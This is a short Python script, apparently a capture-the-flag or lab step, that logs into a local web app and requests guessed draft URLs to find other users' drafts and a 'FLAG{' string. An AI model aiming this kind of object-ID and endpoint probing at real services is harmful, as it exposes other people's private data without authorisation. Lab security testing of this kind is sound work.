python3 << 'PYTHON_SCRIPT'
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()
base_url = "http://127.0.0.1:5003"

# Login first
login_data = {
    'username': 'newuser456',
    'password': 'pass12345',
    'submit': 'Login'
}
response = session.post(f"{base_url}/login", data=login_data, allow_redirects=True)
print(f"Login Status: {response.status_code}")
print(f"Final URL: {response.url}")

# Test various endpoint patterns for drafts
patterns = [
    "/newuser456/drafts",
    "/edit_draft/2",
    "/edit_draft/3",
    "/draft/1",
    "/drafts/1",
    "/newuser456/draft/1",
    "/newuser456/drafts/1",
    "/api/draft/1",
    "/api/drafts/1",
    "/draft/edit/1",
    "/drafts/edit/1"
]

print("\n" + "="*60)
print("TESTING DRAFT ENDPOINT PATTERNS")
print("="*60)

for pattern in patterns:
    url = f"{base_url}{pattern}"
    response = session.get(url)
    print(f"\n{pattern:<25} : Status {response.status_code} | Length {len(response.text):<5}", end="")
    if response.status_code == 200:
        # Check for sensitive info or flags
        if "FLAG{" in response.text:
            print(" | FLAG FOUND!")
        elif "Error" not in response.text and len(response.text) > 1000:
            print(" | DRAFT CONTENT FOUND")
        else:
            print(" | Accessible")
    elif response.status_code == 403:
        print(" | Forbidden")
    elif response.status_code == 404:
        print(" | Not Found")
    elif response.status_code == 302:
        print(f" | Redirects to: {response.headers.get('Location', 'Unknown')}")

